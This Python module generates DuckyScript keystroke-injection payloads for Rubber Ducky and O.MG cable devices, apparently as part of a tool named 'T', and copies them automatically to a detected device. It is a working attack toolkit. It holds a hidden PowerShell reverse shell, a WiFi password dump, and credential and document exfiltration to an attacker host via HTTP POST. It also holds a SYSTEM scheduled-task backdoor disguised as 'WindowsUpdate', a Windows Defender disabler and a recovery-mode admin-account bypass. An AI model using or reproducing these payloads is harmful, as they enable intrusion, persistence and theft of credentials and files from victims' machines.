"""
USB HID payload generator for T.
Generates DuckyScript payloads for Rubber Ducky / O.MG Cable.
T can generate the script from natural language, write the .txt file,
and detect the Ducky drive to auto-copy the payload.
"""

import os
import shutil
from pathlib import Path
from core.logger import get_logger

log = get_logger("devices.usb_hid")

# Default keystroke delay in ms
_DEFAULT_DELAY = 100


# ─── Payload templates ────────────────────────────────────────────────────────

def payload_reverse_shell(lhost: str, lport: str) -> str:
    """PowerShell reverse shell dropper."""
    ps = (
        f"powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "
        f"\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$sb=$r+\\\"PS \\\"+(pwd).Path+\\\"> \\\";"
        f"$sb=[Text.Encoding]::ASCII.GetBytes($sb);"
        f"$s.Write($sb,0,$sb.Length);}}\""
    )
    return _duck_run_powershell(ps)


def payload_wifi_dump() -> str:
    """Extract all saved WiFi passwords and send to clipboard."""
    ps = (
        "(netsh wlan show profiles) | "
        "Select-String ':(.+)$' | "
        "ForEach-Object{$n=$_.Matches.Groups[1].Value.Trim(); "
        "(netsh wlan show profile name=$n key=clear)} | "
        "Select-String 'Key Content' | "
        "ForEach-Object{$_.Matches.Groups[0].Value} | "
        "Out-String | Set-Clipboard"
    )
    return _duck_run_powershell(ps)


def payload_credential_dump(lhost: str, port: str = "8080") -> str:
    """
    Silent credential dump — WiFi passwords + browser creds → HTTP exfil.
    """
    ps = (
        "$o=''; "
        "$o+=(netsh wlan show profiles)|select-string ':(.+)$'|%{"
        "$n=$_.Matches.Groups[1].Value.Trim();"
        "(netsh wlan show profile name=$n key=clear)"
        "}|select-string 'Key Content'|out-string; "
        f"Invoke-WebRequest -Uri 'http://{lhost}:{port}/collect' "
        "-Method POST -Body $o -UseBasicParsing"
    )
    return _duck_run_powershell(ps)


def payload_persistence(lhost: str, lport: str) -> str:
    """
    Install persistent reverse shell via scheduled task.
    Runs every 5 minutes even after reboot.
    """
    ps = (
        "$cmd='powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "
        f"$c=New-Object Net.Sockets.TCPClient(`\"{lhost}`\",{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$sb=$r+\"PS \"+(pwd).Path+\"> \";"
        "$sb=[Text.Encoding]::ASCII.GetBytes($sb);"
        "$s.Write($sb,0,$sb.Length);}'; "
        "schtasks /create /tn 'WindowsUpdate' /tr $cmd /sc MINUTE /mo 5 /ru SYSTEM /f"
    )
    return _duck_run_powershell(ps)


def payload_defender_disable() -> str:
    """Disable Windows Defender and add exclusion for C:\\."""
    ps = (
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Add-MpPreference -ExclusionPath 'C:\\'; "
        "Set-MpPreference -SubmitSamplesConsent 2"
    )
    return _duck_run_admin_powershell(ps)


def payload_exfil_documents(lhost: str, port: str = "8080") -> str:
    """Compress Desktop + Documents and POST to attacker server."""
    ps = (
        "$t=[IO.Path]::GetTempFileName()+'.zip'; "
        "Compress-Archive -Path $env:USERPROFILE\\Desktop,"
        "$env:USERPROFILE\\Documents -DestinationPath $t -Force; "
        f"Invoke-WebRequest -Uri 'http://{lhost}:{port}/upload' "
        "-Method POST -InFile $t -UseBasicParsing; "
        "Remove-Item $t"
    )
    return _duck_run_powershell(ps)


def payload_lock_screen_bypass() -> str:
    """
    Boot into Windows recovery, add new admin user.
    Requires physical access + reboot (advanced).
    """
    return """DELAY 3000
GUI r
DELAY 500
STRING cmd /k shutdown /r /o /f /t 00
ENTER
DELAY 15000
COMMENT -- At WinRE: Troubleshoot > Advanced > Command Prompt
STRING net user T@dmin P@ssw0rd123 /add
ENTER
STRING net localgroup administrators T@dmin /add
ENTER
STRING exit
ENTER"""


def payload_custom(description: str, commands: list[str]) -> str:
    """Build a custom DuckyScript from a list of string commands."""
    lines = [f"DELAY {_DEFAULT_DELAY}", "GUI r", "DELAY 500",
             "STRING cmd /k", "ENTER", "DELAY 700"]
    for cmd in commands:
        lines.append(f"STRING {cmd}")
        lines.append("ENTER")
        lines.append(f"DELAY {_DEFAULT_DELAY}")
    lines.append("STRING exit")
    lines.append("ENTER")
    return "\n".join(lines)


# ─── Internal helpers ─────────────────────────────────────────────────────────

def _duck_run_powershell(ps_command: str) -> str:
    return f"""DELAY {_DEFAULT_DELAY}
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -NonInteractive -Command "{ps_command}"
ENTER"""


def _duck_run_admin_powershell(ps_command: str) -> str:
    return f"""DELAY {_DEFAULT_DELAY}
GUI x
DELAY 400
STRING a
DELAY 1000
LEFT
ENTER
DELAY 1500
STRING powershell -Command "{ps_command}"
ENTER"""


# ─── File output ──────────────────────────────────────────────────────────────

def save_payload(script: str, filename: str = "inject.txt") -> str:
    """Save DuckyScript to a temp file. Returns path."""
    path = Path(os.environ.get("TEMP", "/tmp")) / filename
    path.write_text(script, encoding="utf-8")
    log.info(f"DuckyScript saved to {path}")
    return str(path)


def detect_ducky_drive() -> str | None:
    """
    Detect Rubber Ducky / O.MG drive on Windows.
    Returns drive letter (e.g. 'E:') or None.
    Looks for a drive containing 'inject.txt' or named 'DUCKY'.
    """
    import subprocess
    try:
        result = subprocess.run(
            ["wmic", "logicaldisk", "get", "DeviceID,VolumeName"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 1:
                drive = parts[0]
                label = parts[1] if len(parts) > 1 else ""
                if "DUCKY" in label.upper() or "OMG" in label.upper():
                    return drive
                # Check if inject.txt exists on drive
                if os.path.exists(os.path.join(drive + "\\", "inject.txt")):
                    return drive
    except Exception as e:
        log.warning(f"Ducky drive detection failed: {e}")
    return None


def deploy_to_ducky(script: str) -> tuple[bool, str]:
    """
    Save script and copy to detected Ducky drive.
    Returns (success, message).
    """
    local_path = save_payload(script)
    drive = detect_ducky_drive()
    if not drive:
        return False, f"Rubber Ducky not detected. Script saved to {local_path}"

    dest = os.path.join(drive + "\\", "inject.txt")
    try:
        shutil.copy2(local_path, dest)
        msg = f"Payload deployed to {dest}"
        log.info(msg)
        return True, msg
    except Exception as e:
        return False, f"Deploy failed: {e}. Script at {local_path}"


# ─── Payload catalog ──────────────────────────────────────────────────────────

PAYLOADS: dict[str, dict] = {
    "reverse_shell":    {"name": "Reverse Shell (PowerShell)", "params": ["lhost", "lport"], "risk": "CRITICAL"},
    "wifi_dump":        {"name": "WiFi Password Dump → Clipboard", "params": [], "risk": "HIGH"},
    "credential_dump":  {"name": "Credential Dump → HTTP Exfil", "params": ["lhost", "port"], "risk": "CRITICAL"},
    "persistence":      {"name": "Persistent Reverse Shell (Scheduled Task)", "params": ["lhost", "lport"], "risk": "CRITICAL"},
    "defender_disable": {"name": "Disable Windows Defender", "params": [], "risk": "CRITICAL"},
    "exfil_documents":  {"name": "Exfiltrate Desktop + Documents", "params": ["lhost", "port"], "risk": "CRITICAL"},
    "lock_bypass":      {"name": "Lock Screen Bypass (WinRE)", "params": [], "risk": "CRITICAL"},
}


def build_payload(payload_id: str, params: dict) -> tuple[str, str]:
    """
    Build a payload script from its ID and params.
    Returns (script, description).
    """
    if payload_id == "reverse_shell":
        script = payload_reverse_shell(params["lhost"], params["lport"])
    elif payload_id == "wifi_dump":
        script = payload_wifi_dump()
    elif payload_id == "credential_dump":
        script = payload_credential_dump(params["lhost"], params.get("port", "8080"))
    elif payload_id == "persistence":
        script = payload_persistence(params["lhost"], params["lport"])
    elif payload_id == "defender_disable":
        script = payload_defender_disable()
    elif payload_id == "exfil_documents":
        script = payload_exfil_documents(params["lhost"], params.get("port", "8080"))
    elif payload_id == "lock_bypass":
        script = payload_lock_screen_bypass()
    else:
        script = payload_custom("custom", params.get("commands", []))

    info = PAYLOADS.get(payload_id, {"name": payload_id})
    desc = info["name"]
    return script, desc
